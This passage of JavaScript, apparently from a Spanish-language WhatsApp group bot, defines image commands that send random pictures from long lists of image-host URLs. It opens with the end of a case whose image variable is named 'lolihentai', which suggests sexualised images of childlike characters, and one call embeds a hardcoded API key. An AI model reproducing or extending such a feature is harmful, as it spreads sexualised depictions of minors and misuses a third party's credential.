fNg3_t.jpg','https://thumbs2.imgbox.com/66/a2/t9iP20Q2_t.jpg','https://thumbs2.imgbox.com/52/b8/AmcggKTi_t.jpg','https://thumbs2.imgbox.com/ba/b7/Q7jZ4uSF_t.jpg','https://thumbs2.imgbox.com/ec/30/5bKyT40W_t.jpg','https://thumbs2.imgbox.com/58/ee/pKcc5Oo5_t.jpg','https://thumbs2.imgbox.com/12/fd/RUQpz4Yz_t.jpg','https://thumbs2.imgbox.com/aa/ef/gBqtaAIA_t.jpg','https://thumbs2.imgbox.com/70/f8/3OjbhjOI_t.jpg','https://thumbs2.imgbox.com/5a/62/YGingUWM_t.jpg','https://thumbs2.imgbox.com/5e/1a/yvWE1apR_t.jpg','https://thumbs2.imgbox.com/b2/d4/RsHakCgl_t.jpg','https://thumbs2.imgbox.com/9e/39/nDULAIxQ_t.jpg','https://thumbs2.imgbox.com/85/b3/xNEnT3R4_t.jpg','https://thumbs2.imgbox.com/85/da/VXaFcNcO_t.jpg','https://thumbs2.imgbox.com/aa/f3/qKuoOVUU_t.jpg','https://thumbs2.imgbox.com/17/f5/tg4zqaPg_t.jpg','https://thumbs2.imgbox.com/80/a1/dTbBIQLp_t.jpg','https://thumbs2.imgbox.com/b7/94/YF0YLOuQ_t.jpg','https://thumbs2.imgbox.com/e1/d8/YY01kgLa_t.jpg','https://thumbs2.imgbox.com/2f/0e/mWzOu7Vx_t.jpg','https://thumbs2.imgbox.com/b6/61/CACoYq1B_t.jpg','https://thumbs2.imgbox.com/c0/31/5v9CQKQ4_t.jpg','https://thumbs2.imgbox.com/3e/95/DlsFbB3R_t.jpg','https://thumbs2.imgbox.com/78/24/uAAu21k5_t.jpg','https://thumbs2.imgbox.com/dc/22/kf6V4EmS_t.jpg','https://thumbs2.imgbox.com/07/31/lfDnWDHv_t.jpg','https://thumbs2.imgbox.com/09/a4/KzYkfMc6_t.jpg','https://thumbs2.imgbox.com/5a/df/RZfi0wUa_t.jpg','https://thumbs2.imgbox.com/20/62/BJCVubHe_t.jpg','https://thumbs2.imgbox.com/ff/59/NvIM06ca_t.jpg','https://thumbs2.imgbox.com/04/8e/7brJ16cQ_t.jpg','https://thumbs2.imgbox.com/09/43/XvANAfMD_t.jpg','https://thumbs2.imgbox.com/6e/5d/zpLxUaHj_t.jpg','https://thumbs2.imgbox.com/8c/b4/cYIUcpTi_t.jpg','https://thumbs2.imgbox.com/fb/55/Ur7CsSob_t.jpg','https://thumbs2.imgbox.com/71/62/orHOuu5t_t.jpg','https://thumbs2.imgbox.com/74/26/A7rD7r2T_t.jpg','https://thumbs2.imgbox.com/c9/70/BF1PenD4_t.jpg','https://thumbs2.imgbox.com/3e/2a/JHLt8kei_t.jpg','https://thumbs2.imgbox.com/40/9a/mUMGFZST_t.jpg','https://thumbs2.imgbox.com/48/c1/xho3bvk9_t.jpg','https://thumbs2.imgbox.com/eb/71/2N61ITSP_t.jpg','https://thumbs2.imgbox.com/e3/c2/u9S72YLI_t.jpg','https://thumbs2.imgbox.com/30/84/m7RJQ5Sj_t.jpg','https://thumbs2.imgbox.com/dd/96/37Rmje4G_t.jpg','https://thumbs2.imgbox.com/11/21/v93Mk6V2_t.jpg','https://thumbs2.imgbox.com/86/2c/HYeVuwYr_t.jpg','https://thumbs2.imgbox.com/e4/b0/Yyjhrptr_t.jpg','https://thumbs2.imgbox.com/f8/90/jRMA7BVj_t.jpg','https://thumbs2.imgbox.com/7c/7c/wQBkVicp_t.jpg','https://thumbs2.imgbox.com/11/6a/ysrrKLQA_t.jpg','https://thumbs2.imgbox.com/ff/9f/2670UYOE_t.jpg','https://thumbs2.imgbox.com/6c/57/7fewT6Gc_t.jpg','https://thumbs2.imgbox.com/af/c9/3YilkJTT_t.jpg','https://thumbs2.imgbox.com/2c/9f/vivQXhvy_t.jpg','https://thumbs2.imgbox.com/c9/c0/hU60xmd4_t.jpg','https://thumbs2.imgbox.com/16/92/dRmTFIMp_t.jpg','https://thumbs2.imgbox.com/86/03/yLPtLIFw_t.jpg','https://thumbs2.imgbox.com/5b/c9/3dPRjCNk_t.jpg','https://thumbs2.imgbox.com/05/e9/0KVOFZF3_t.jpg','https://thumbs2.imgbox.com/43/fb/LyLWmQTa_t.jpg','https://thumbs2.imgbox.com/35/6f/1XFma9fk_t.jpg','https://thumbs2.imgbox.com/79/f9/mv8QCVbA_t.jpg','https://thumbs2.imgbox.com/12/07/Uu5svoSb_t.jpg','https://thumbs2.imgbox.com/f2/a3/N0QS8JHe_t.jpg','https://thumbs2.imgbox.com/f1/49/F1fQs6Pp_t.jpg','https://thumbs2.imgbox.com/0e/b5/csl8SP9N_t.jpg','https://thumbs2.imgbox.com/f8/53/RJMDxMYF_t.jpg','https://thumbs2.imgbox.com/2b/53/CJb0Mnli_t.jpg','https://thumbs2.imgbox.com/19/78/TIyXPzWQ_t.jpg','https://thumbs2.imgbox.com/c1/70/wMGWSl4J_t.jpg','https://thumbs2.imgbox.com/96/b7/HbxBFg72_t.jpg','https://thumbs2.imgbox.com/80/0a/yTWmCdPK_t.jpg','https://thumbs2.imgbox.com/b6/b0/OMcl6yFp_t.jpg','https://thumbs2.imgbox.com/7d/54/ubPf2IWu_t.jpg','https://thumbs2.imgbox.com/5a/af/6PFRzGDq_t.jpg','https://thumbs2.imgbox.com/42/93/S1nAqLT5_t.jpg','https://thumbs2.imgbox.com/89/48/cHGZrxCy_t.jpg','https://thumbs2.imgbox.com/29/a2/UlNJy5I1_t.jpg','https://thumbs2.imgbox.com/a3/c3/WIHrQGMg_t.jpg','https://thumbs2.imgbox.com/b1/69/A5GyXe2M_t.jpg','https://thumbs2.imgbox.com/7d/32/QHOvCQbp_t.jpg','https://thumbs2.imgbox.com/6a/da/eYfZ2ZcK_t.jpg','https://thumbs2.imgbox.com/37/ba/Z6G1pVP5_t.jpg','https://thumbs2.imgbox.com/8a/3e/DqS3RMZf_t.jpg','https://thumbs2.imgbox.com/64/fa/0KpcScNJ_t.jpg','https://thumbs2.imgbox.com/48/40/p45b6z7x_t.jpg','https://thumbs2.imgbox.com/a4/da/X2xAj2Wb_t.jpg','https://thumbs2.imgbox.com/88/7f/oxom3Wqc_t.jpg','https://thumbs2.imgbox.com/5d/67/1vaUtyEM_t.jpg','https://thumbs2.imgbox.com/0b/0a/upsVEzyL_t.jpg','https://thumbs2.imgbox.com/b6/de/rLFC5hD5_t.jpg','https://thumbs2.imgbox.com/f5/12/53I01fZe_t.jpg','https://thumbs2.imgbox.com/4a/47/PzQE4Kcc_t.jpg','https://thumbs2.imgbox.com/1e/a4/yFFD1TSc_t.jpg','https://thumbs2.imgbox.com/fb/f0/Kdec72JV_t.jpg','https://thumbs2.imgbox.com/c3/34/yXNdn482_t.jpg','https://thumbs2.imgbox.com/34/d1/VWQw7AQ0_t.jpg','https://thumbs2.imgbox.com/dc/6c/PhbRDQPv_t.jpg','https://thumbs2.imgbox.com/03/a1/C9eLvTqR_t.jpg','https://thumbs2.imgbox.com/39/ae/2jCINLhI_t.jpg','https://thumbs2.imgbox.com/d6/83/LUHHnJ2d_t.jpg','https://thumbs2.imgbox.com/e3/96/JRSUcv9h_t.jpg','https://thumbs2.imgbox.com/9c/42/TX6FdnG7_t.jpg','https://thumbs2.imgbox.com/33/8f/1LuHhos9_t.jpg','https://thumbs2.imgbox.com/5a/ae/RfHOSV0R_t.jpg','https://thumbs2.imgbox.com/cf/e7/8toQ2RZo_t.jpg','https://thumbs2.imgbox.com/58/19/Do6DmGzt_t.jpg','https://thumbs2.imgbox.com/33/1b/m6kGz6di_t.jpg','https://thumbs2.imgbox.com/72/54/9w3qqVNg_t.jpg','https://thumbs2.imgbox.com/ad/68/4brAU2GV_t.jpg','https://thumbs2.imgbox.com/e0/f2/6ViKtQKw_t.jpg','https://thumbs2.imgbox.com/59/f0/GWqrHvyv_t.jpg','https://thumbs2.imgbox.com/58/76/j6VhGg4E_t.jpg','https://thumbs2.imgbox.com/a0/81/shl7Oaky_t.jpg','https://thumbs2.imgbox.com/1b/10/vrDTDOV9_t.jpg','https://thumbs2.imgbox.com/09/a0/hOO6lyjB_t.jpg','https://thumbs2.imgbox.com/c3/93/Rvh0xd7R_t.jpg','https://thumbs2.imgbox.com/d3/1e/xTergnDF_t.jpg','https://thumbs2.imgbox.com/74/30/jBxB09pW_t.jpg','https://thumbs2.imgbox.com/34/16/zyG2mzb9_t.jpg','https://thumbs2.imgbox.com/42/af/YygPJWxy_t.jpg','https://thumbs2.imgbox.com/67/83/BL87lFtn_t.jpg','https://thumbs2.imgbox.com/ea/68/WAmcisdq_t.jpg','https://thumbs2.imgbox.com/9e/54/Q7DdhoNL_t.jpg','https://thumbs2.imgbox.com/17/7d/CWvQ0u3G_t.jpg','https://thumbs2.imgbox.com/c8/91/smNqJHiO_t.jpg','https://thumbs2.imgbox.com/74/d7/MgfdaCo5_t.jpg','https://thumbs2.imgbox.com/22/7a/CsQBOx4O_t.jpg','https://thumbs2.imgbox.com/c6/59/IJ632PwT_t.jpg','https://thumbs2.imgbox.com/d6/1a/eOI8UI84_t.jpg','https://thumbs2.imgbox.com/5f/f9/rctO9Wsh_t.jpg','https://thumbs2.imgbox.com/cb/34/Eqjwn6vV_t.jpg','https://thumbs2.imgbox.com/a0/06/1zcCoceP_t.jpg']
let petan = dest[Math.floor(Math.random() * dest.length)]
lolihentai = await getBuffer(petan)
cnf.sendMessage(from, lolihentai, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break

case prefix+'waifu':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	  
sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/sfw/neko?apikey=Ikyy69`)
reply('Aquí tienes 💕🦈')
addFilter(from)
break
		
case prefix+'sakura':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
const saku =['https://i.ibb.co/tCjfyP1/42.jpg','https://i.ibb.co/QDwhvmd/37.jpg','https://i.ibb.co/XsV6JMF/15.jpg','https://i.ibb.co/51kyLsw/36.jpg','https://i.ibb.co/YRYHKmG/14.jpg','https://i.ibb.co/tm0NYYM/39.jpg','https://i.ibb.co/G5twXCz/17.jpg','https://i.ibb.co/jDQG3KL/16.jpg','https://i.ibb.co/N1MsmBg/38.jpg','https://i.ibb.co/x226p3B/33.jpg','https://i.ibb.co/kJ0kvkK/32.jpg','https://i.ibb.co/KKtQCv5/35.jpg','https://i.ibb.co/6NFfgYD/13.jpg','https://i.ibb.co/FBV26M5/12.jpg','https://i.ibb.co/4V4bNhv/34.jpg','https://i.ibb.co/2ZtKK7Y/3.jpg','https://i.ibb.co/mSsFYpp/19.jpg','https://i.ibb.co/99yhr61/41.jpg','https://i.ibb.co/wM0wpph/18.jpg','https://i.ibb.co/NSdt9M2/40.jpg','https://i.ibb.co/5GsQ0M0/21.jpg','https://i.ibb.co/nD3fXdp/20.jpg','https://i.ibb.co/kKzsVC2/26.jpg','https://i.ibb.co/9TLrHKq/4.jpg','https://i.ibb.co/dLd11N2/25.jpg','https://i.ibb.co/xHcBCF6/1.jpg','https://i.ibb.co/XScSFRt/28.jpg','https://i.ibb.co/6mkfG4k/6.jpg','https://i.ibb.co/f8X0QxH/5.jpg','https://i.ibb.co/xMDxFhW/27.jpg','https://i.ibb.co/BsGDBM9/22.jpg','https://i.ibb.co/zP3yPvQ/44.jpg','https://i.ibb.co/rtsrbLw/43.jpg','https://i.ibb.co/KmwN3jq/2.jpg','https://i.ibb.co/xXGSvLf/46.jpg','https://i.ibb.co/Jr6QGh7/24.jpg','https://i.ibb.co/MfKYGfP/45.jpg','https://i.ibb.co/G0kXbvR/23.jpg','https://i.ibb.co/nRDZpHx/11.jpg','https://i.ibb.co/hBrPSrb/8.jpg','https://i.ibb.co/RCP18Qd/30.jpg','https://i.ibb.co/DD3jjCV/7.jpg','https://i.ibb.co/YD54YbH/29.jpg','https://i.ibb.co/JQ6Q7vS/10.jpg','https://i.ibb.co/B2bDnd4/31.jpg','https://i.ibb.co/HY0mxbt/9.jpg']
let ra = saku[Math.floor(Math.random() * saku.length)]
sakura = await getBuffer(ra)
cnf.sendMessage(from, sakura, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break
					
case prefix+'hero':
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
const ura =['https://thumbs2.imgbox.com/e2/5c/E2E0AOKu_t.jpg','https://thumbs2.imgbox.com/7a/05/YMc5JQTI_t.jpg','https://thumbs2.imgbox.com/6a/db/eDrUcHCR_t.jpg','https://thumbs2.imgbox.com/9d/11/yD9hbdOo_t.jpg','https://thumbs2.imgbox.com/93/1a/tmecaXQV_t.jpg','https://thumbs2.imgbox.com/e8/54/bvdndWQT_t.png','https://thumbs2.imgbox.com/47/99/a9aLoxMx_t.png','https://thumbs2.imgbox.com/1d/3e/F9OmSDRj_t.jpg','https://thumbs2.imgbox.com/7e/db/kwum4Z1h_t.jpg','https://thumbs2.imgbox.com/cf/cf/DSl05p60_t.jpg','https://thumbs2.imgbox.com/6f/d3/3IRHo8UM_t.jpg','https://thumbs2.imgbox.com/7f/d4/jwITlOdd_t.jpg','https://thumbs2.imgbox.com/05/29/OJh2zjaw_t.jpg','https://thumbs2.imgbox.com/a0/e6/ZU2fNlzQ_t.jpg','https://thumbs2.imgbox.com/79/30/sMnotQ8c_t.png','https://thumbs2.imgbox.com/54/86/b7q9P9L4_t.png','https://thumbs2.imgbox.com/18/87/8fGpApFb_t.jpg','https://thumbs2.imgbox.com/5c/ac/TT7QcQKG_t.jpg','https://thumbs2.imgbox.com/3f/3f/i5xzUHVa_t.jpg','https://thumbs2.imgbox.com/60/49/Ao7ztHZX_t.jpg','https://thumbs2.imgbox.com/ba/9b/4rMiCHcD_t.jpg','https://thumbs2.imgbox.com/99/5b/q52YqlPj_t.jpg','https://thumbs2.imgbox.com/aa/3f/JW76svCx_t.jpg','https://thumbs2.imgbox.com/40/19/X6QmD4ac_t.jpg','https://thumbs2.imgbox.com/b9/83/AeXoGlk2_t.jpg','https://thumbs2.imgbox.com/51/69/oxFBVuri_t.jpg','https://thumbs2.imgbox.com/a2/4d/ClkyME7k_t.jpg','https://thumbs2.imgbox.com/07/8b/7DKL2b5S_t.jpg','https://thumbs2.imgbox.com/b4/e7/JobMCr1T_t.jpg','https://thumbs2.imgbox.com/ca/82/fn4t2Bw8_t.jpg','https://thumbs2.imgbox.com/8e/a4/1Y8pP0tC_t.jpg','https://thumbs2.imgbox.com/8c/d2/V5xClF3I_t.jpg','https://thumbs2.imgbox.com/34/b8/VwcJ7Sro_t.jpg','https://thumbs2.imgbox.com/e2/31/Ygg3Ag1A_t.jpg','https://thumbs2.imgbox.com/b0/ab/PuRyzWgx_t.jpg','https://thumbs2.imgbox.com/cc/8f/4kzOdPEJ_t.jpg','https://thumbs2.imgbox.com/89/86/hnSmmBEF_t.jpg','https://thumbs2.imgbox.com/3c/bf/WZPNLtBz_t.jpg','https://thumbs2.imgbox.com/6a/be/Bt5PhesI_t.jpg','https://thumbs2.imgbox.com/73/8b/90gmHc4J_t.jpg','https://thumbs2.imgbox.com/41/74/v0N1bbuv_t.jpg','https://thumbs2.imgbox.com/8d/d8/JskN8O0l_t.jpg','https://thumbs2.imgbox.com/ae/34/6UbL2w0L_t.jpg','https://thumbs2.imgbox.com/a0/48/a0i8M87o_t.jpg','https://thumbs2.imgbox.com/e6/53/WAcWMRKt_t.jpg','https://thumbs2.imgbox.com/c1/17/9YofhZoL_t.jpg','https://thumbs2.imgbox.com/6a/07/7CCKUkIp_t.jpg','https://thumbs2.imgbox.com/67/1c/pZGolyvF_t.jpg','https://thumbs2.imgbox.com/32/61/00kHLUKy_t.png','https://thumbs2.imgbox.com/6e/85/F7e1WHaY_t.png','https://thumbs2.imgbox.com/ac/34/q4ZrhHk2_t.jpg','https://thumbs2.imgbox.com/3f/ae/kl9BIzM1_t.jpg','https://thumbs2.imgbox.com/e6/78/ZAyNDYgJ_t.jpg','https://thumbs2.imgbox.com/6c/db/42FpQ41H_t.jpg','https://thumbs2.imgbox.com/b3/af/BOlWD09R_t.jpg','https://thumbs2.imgbox.com/ad/6b/oyAQb2Mk_t.jpg','https://thumbs2.imgbox.com/3a/f5/a7NnTh8K_t.jpg','https://thumbs2.imgbox.com/d4/57/QBvqiQEk_t.jpg','https://thumbs2.imgbox.com/fd/43/H933cnfc_t.jpg','https://thumbs2.imgbox.com/6c/e6/igLxJNWn_t.jpg','https://thumbs2.imgbox.com/4a/8d/wAp8SwAq_t.jpg','https://thumbs2.imgbox.com/ed/ac/FEo6X1pU_t.jpg','https://thumbs2.imgbox.com/7b/cf/TJZpK6nD_t.jpg','https://thumbs2.imgbox.com/12/ed/Jl0e31GT_t.jpg','https://thumbs2.imgbox.com/3d/8d/mAgLZcql_t.jpg','https://thumbs2.imgbox.com/70/3c/EGKmUy7o_t.jpg','https://thumbs2.imgbox.com/21/d4/WnE1nXK1_t.png','https://thumbs2.imgbox.com/fe/84/gZcEhBjn_t.jpg','https://thumbs2.imgbox.com/c2/85/cf6QRL3G_t.jpg','https://thumbs2.imgbox.com/fa/6a/COqs8qh2_t.jpg','https://thumbs2.imgbox.com/b4/73/OaoHwQ8t_t.jpg','https://thumbs2.imgbox.com/ef/4c/4kzDFVHa_t.jpg','https://thumbs2.imgbox.com/86/66/2rJedVTO_t.jpg','https://thumbs2.imgbox.com/18/29/B2o2ow2Q_t.jpg','https://thumbs2.imgbox.com/24/a4/PVA2eBLZ_t.jpg','https://thumbs2.imgbox.com/4a/7b/eskoMa7p_t.jpg','https://thumbs2.imgbox.com/17/1b/Vu67Xtip_t.jpg','https://thumbs2.imgbox.com/d2/33/8bx9PM4R_t.jpg','https://thumbs2.imgbox.com/e5/9b/UMcpy1NX_t.png','https://thumbs2.imgbox.com/7f/f1/yPpkgGpY_t.png','https://thumbs2.imgbox.com/73/16/zeLsR2ot_t.png','https://thumbs2.imgbox.com/4f/a5/dPNrKQ2n_t.jpg','https://thumbs2.imgbox.com/3d/de/opZj1ow8_t.jpg','https://thumbs2.imgbox.com/58/55/LHRw3DAu_t.png','https://thumbs2.imgbox.com/97/82/VkIQhsqI_t.jpg','https://thumbs2.imgbox.com/89/07/sQj94zzI_t.jpg','https://thumbs2.imgbox.com/4c/03/Xd8cy8Q2_t.jpg','https://thumbs2.imgbox.com/a1/40/UWpMYTnk_t.jpg','https://thumbs2.imgbox.com/3b/86/UxngDLt3_t.jpg','https://thumbs2.imgbox.com/f3/ed/ZgNoWTMO_t.jpg','https://thumbs2.imgbox.com/bc/be/ux0udiAE_t.jpg','https://thumbs2.imgbox.com/f7/d7/ti7wx8KN_t.jpg','https://thumbs2.imgbox.com/1f/cd/OGghXTt5_t.jpg','https://thumbs2.imgbox.com/8b/9d/67aFRJvR_t.jpg','https://thumbs2.imgbox.com/8e/2d/E4iIyKv3_t.jpg','https://thumbs2.imgbox.com/03/eb/GY8Xhdlf_t.jpg','https://thumbs2.imgbox.com/87/54/pixB8kdb_t.jpg','https://thumbs2.imgbox.com/f1/ce/STqDA7wx_t.jpg','https://thumbs2.imgbox.com/bb/ac/mDbhLB8r_t.jpg','https://thumbs2.imgbox.com/9c/99/WVvqWkh1_t.jpg','https://thumbs2.imgbox.com/a2/10/7r45droB_t.jpg','https://thumbs2.imgbox.com/41/23/hqZSNROE_t.jpg','https://thumbs2.imgbox.com/0b/b6/bzJeG9Gw_t.jpg','https://thumbs2.imgbox.com/b1/cd/FA3p0ErW_t.jpg','https://thumbs2.imgbox.com/cf/c4/WjBDb3Hv_t.jpg','https://thumbs2.imgbox.com/03/05/pNxkkgAT_t.png','https://thumbs2.imgbox.com/95/97/ooyAdYsF_t.jpg','https://thumbs2.imgbox.com/4c/9e/dsrnJxRQ_t.png','https://thumbs2.imgbox.com/6d/57/pAkvhQb8_t.png','https://thumbs2.imgbox.com/36/b1/SQ49TuPq_t.jpg','https://thumbs2.imgbox.com/82/13/JQ0oaXB2_t.jpg','https://thumbs2.imgbox.com/49/4d/raYcwRD9_t.jpg','https://thumbs2.imgbox.com/68/07/qKrLM7fZ_t.jpg','https://thumbs2.imgbox.com/b6/8b/Cnjby0wK_t.jpg','https://thumbs2.imgbox.com/a0/04/83ROoJc8_t.jpg','https://thumbs2.imgbox.com/74/b3/ZmXXSgcE_t.jpg','https://thumbs2.imgbox.com/86/07/MFJibTfy_t.jpg','https://thumbs2.imgbox.com/5c/8a/uYr9f9RP_t.jpg','https://thumbs2.imgbox.com/ad/d8/4k6UIBlj_t.jpg','https://thumbs2.imgbox.com/02/4d/8pNN0XfC_t.jpg','https://thumbs2.imgbox.com/9f/2b/0PbHUt94_t.jpg','https://thumbs2.imgbox.com/43/06/21fi6HsO_t.jpg','https://thumbs2.imgbox.com/79/52/YOhvI5Np_t.jpg','https://thumbs2.imgbox.com/34/5a/54Kg6aRH_t.jpg','https://thumbs2.imgbox.com/9e/8a/ig5fE5sN_t.jpg','https://thumbs2.imgbox.com/ab/a5/sr3EPdEu_t.jpg','https://thumbs2.imgbox.com/58/ac/zYBVQBPv_t.jpg','https://thumbs2.imgbox.com/e4/97/xqensmXu_t.jpg','https://thumbs2.imgbox.com/dc/1f/4CQnwvpT_t.jpg','https://thumbs2.imgbox.com/86/ed/iLlsfrji_t.jpg','https://thumbs2.imgbox.com/91/ec/oaxpjp8V_t.jpg','https://thumbs2.imgbox.com/ae/24/YWxOxcep_t.jpg','https://thumbs2.imgbox.com/b4/c2/Hc7R0yC2_t.jpg','https://thumbs2.imgbox.com/50/43/locVUKSq_t.jpg','https://thumbs2.imgbox.com/bc/87/QJ2jFcPI_t.jpg','https://thumbs2.imgbox.com/18/46/YemqXhVq_t.jpg','https://thumbs2.imgbox.com/d4/29/sQiaQbtE_t.png','https://thumbs2.imgbox.com/c0/82/vzNxn6WY_t.png','https://thumbs2.imgbox.com/49/a4/8AflLmE5_t.jpg','https://thumbs2.imgbox.com/94/87/OwIMKt1b_t.jpg','https://thumbs2.imgbox.com/57/9e/30o2GrPV_t.jpg','https://thumbs2.imgbox.com/e2/5e/sWuI2eyn_t.jpg','https://thumbs2.imgbox.com/3d/d6/rOv7wr8c_t.jpg','https://thumbs2.imgbox.com/1c/73/blKMun1E_t.jpg','https://thumbs2.imgbox.com/32/e6/dLLUKeNL_t.jpg','https://thumbs2.imgbox.com/93/29/pT8IlKaK_t.jpg','https://thumbs2.imgbox.com/c4/01/vr4GZ3N4_t.jpg','https://thumbs2.imgbox.com/be/44/Cbqcp3W9_t.jpg','https://thumbs2.imgbox.com/82/f2/u8CJOzQM_t.jpg','https://thumbs2.imgbox.com/90/a9/9r6i3OK7_t.jpg','https://thumbs2.imgbox.com/92/83/AoFJfDvs_t.jpg','https://thumbs2.imgbox.com/d3/f5/L7YExn8K_t.jpg','https://thumbs2.imgbox.com/01/66/Vs7MDftX_t.jpg','https://thumbs2.imgbox.com/af/bd/2FyPu1HX_t.jpg','https://thumbs2.imgbox.com/d7/e0/JnQhJIz1_t.jpg','https://thumbs2.imgbox.com/ba/32/PykOuaK5_t.jpg','https://thumbs2.imgbox.com/6a/80/mQu3NfxY_t.jpg','https://thumbs2.imgbox.com/8c/b1/DWuwYn3K_t.jpg','https://thumbs2.imgbox.com/44/e9/XZJii7mo_t.jpg','https://thumbs2.imgbox.com/a1/4d/5ldkl5p4_t.jpg','https://thumbs2.imgbox.com/f9/f7/HeJ4WlF4_t.jpg','https://thumbs2.imgbox.com/aa/4f/rKJFZJYF_t.jpg','https://thumbs2.imgbox.com/21/79/j3gq16tv_t.jpg','https://thumbs2.imgbox.com/d4/45/p4RRpPQ0_t.jpg','https://thumbs2.imgbox.com/1f/c9/6dCM52Vw_t.jpg','https://thumbs2.imgbox.com/13/62/m3yk7raV_t.jpg','https://thumbs2.imgbox.com/a8/d8/8bzD9cSd_t.jpg','https://thumbs2.imgbox.com/5a/25/2up8M0lw_t.jpg','https://thumbs2.imgbox.com/1f/70/eYy4NTnB_t.jpg','https://thumbs2.imgbox.com/a1/30/qVnxTGck_t.jpg','https://thumbs2.imgbox.com/f1/6e/MHNSRheu_t.jpg','https://thumbs2.imgbox.com/ef/d2/ni54A6mk_t.jpg','https://thumbs2.imgbox.com/5d/a6/oPbddWqd_t.jpg','https://thumbs2.imgbox.com/2e/14/huGqdgph_t.jpg','https://thumbs2.imgbox.com/1b/89/hOTkrc7t_t.jpg','https://thumbs2.imgbox.com/49/75/bmXRU92k_t.jpg','https://thumbs2.imgbox.com/51/0c/yIkWcwpk_t.jpg','https://thumbs2.imgbox.com/c5/37/AIEuqubJ_t.jpg','https://thumbs2.imgbox.com/88/69/iZvoxQym_t.jpg','https://thumbs2.imgbox.com/7e/b4/tPUIeR9Q_t.jpg','https://thumbs2.imgbox.com/e1/8b/CGvyj6pF_t.jpg','https://thumbs2.imgbox.com/b7/bd/3bFtJezZ_t.jpg','https://thumbs2.imgbox.com/09/e2/GAbihlvI_t.jpg','https://thumbs2.imgbox.com/69/32/2mkzRaiS_t.jpg','https://thumbs2.imgbox.com/48/25/u2ib9vLB_t.jpg','https://thumbs2.imgbox.com/8b/aa/JFzj2ren_t.jpg','https://thumbs2.imgbox.com/5f/db/cZHy2Z4A_t.jpg','https://thumbs2.imgbox.com/c3/f1/scd7nuOi_t.jpg','https://thumbs2.imgbox.com/3e/b3/BvVlSSQw_t.jpg','https://thumbs2.imgbox.com/be/74/bcyEEHLV_t.jpg','https://thumbs2.imgbox.com/00/42/LYk7CW2w_t.jpg','https://thumbs2.imgbox.com/38/75/8lpgoMXr_t.jpg','https://thumbs2.imgbox.com/e1/ab/30IWl9wn_t.jpg','https://thumbs2.imgbox.com/38/46/Y1HobCu8_t.png','https://thumbs2.imgbox.com/9f/43/VaoRFsfs_t.png','https://thumbs2.imgbox.com/48/93/rMsgckUH_t.png','https://thumbs2.imgbox.com/e3/72/CF48E5P8_t.png','https://thumbs2.imgbox.com/d2/9b/uXe5FTSS_t.png','https://thumbs2.imgbox.com/c3/4b/rAMnaoFN_t.png','https://thumbs2.imgbox.com/59/95/mIOtRAqJ_t.png','https://thumbs2.imgbox.com/db/e0/egPaGb36_t.png','https://thumbs2.imgbox.com/6a/56/0s6cL304_t.png','https://thumbs2.imgbox.com/d0/31/lysEnN1R_t.jpg','https://thumbs2.imgbox.com/14/de/BIK1VClx_t.jpg','https://thumbs2.imgbox.com/86/c9/bmVF6tSI_t.png','https://thumbs2.imgbox.com/18/f5/NsHchamq_t.png','https://thumbs2.imgbox.com/af/6f/9YRE4aaf_t.png','https://thumbs2.imgbox.com/57/3f/yseZFvZr_t.jpg','https://thumbs2.imgbox.com/d3/2b/EpGhivEQ_t.jpg','https://thumbs2.imgbox.com/f9/99/jbAJ1hG5_t.jpg','https://thumbs2.imgbox.com/9a/a4/fxx3c2x1_t.jpg','https://thumbs2.imgbox.com/f1/1d/HfG7EBfk_t.jpg','https://thumbs2.imgbox.com/0d/d2/pImaizZF_t.jpg','https://thumbs2.imgbox.com/0a/37/NkyuiuBY_t.jpg','https://thumbs2.imgbox.com/84/f0/3Znhd14Z_t.png','https://thumbs2.imgbox.com/4e/f3/gN8uGtJE_t.jpg','https://thumbs2.imgbox.com/ae/86/r9XP61A5_t.jpg']
let dek = ura[Math.floor(Math.random() * ura.length)]
hero = await getBuffer(dek)
cnf.sendMessage(from, hero, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break
					
case prefix+'ninte':
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
const sasu =['https://thumbs2.imgbox.com/03/93/aA0eqnSu_t.jpg','https://thumbs2.imgbox.com/2f/00/1Usfx1zJ_t.jpg','https://thumbs2.imgbox.com/40/ee/E9ukwIl6_t.png','https://thumbs2.imgbox.com/f4/19/z03zZcQ2_t.jpg','https://thumbs2.imgbox.com/ff/e9/nMJmrKNq_t.jpg','https://thumbs2.imgbox.com/a6/67/dKeMr6eO_t.jpg','https://thumbs2.imgbox.com/49/90/w2IU0jyT_t.jpg','https://thumbs2.imgbox.com/f2/be/YmY3oU7h_t.jpg','https://thumbs2.imgbox.com/8e/e1/ywdZ81Ga_t.jpg','https://thumbs2.imgbox.com/11/de/X1DEIrcL_t.jpg','https://thumbs2.imgbox.com/e1/7b/EALdyk3n_t.png','https://thumbs2.imgbox.com/89/04/XnyutAL1_t.png','https://thumbs2.imgbox.com/a0/d7/wCbr2LKC_t.jpg','https://thumbs2.imgbox.com/1d/9b/VLTPxa9F_t.jpg','https://thumbs2.imgbox.com/2a/50/Ze5Dg3zf_t.png','https://thumbs2.imgbox.com/bc/b6/srtoIUP0_t.jpg','https://thumbs2.imgbox.com/5a/47/Y2oYqBbJ_t.jpg','https://thumbs2.imgbox.com/91/3d/BFVOGBUr_t.png','https://thumbs2.imgbox.com/5c/15/TD6qgSSE_t.png','https://thumbs2.imgbox.com/e2/bc/WL78vqYh_t.jpg','https://thumbs2.imgbox.com/6b/64/DhkvQMmZ_t.jpg','https://thumbs2.imgbox.com/b2/56/aBC1LSBe_t.jpg','https://thumbs2.imgbox.com/a3/f7/NUVLYqqt_t.jpg','https://thumbs2.imgbox.com/6a/d6/8kzrokSr_t.jpg','https://thumbs2.imgbox.com/8f/9c/umboN69Z_t.jpg','https://thumbs2.imgbox.com/bd/6b/7aowzExk_t.png','https://thumbs2.imgbox.com/91/a4/KstHSTpV_t.jpg','https://thumbs2.i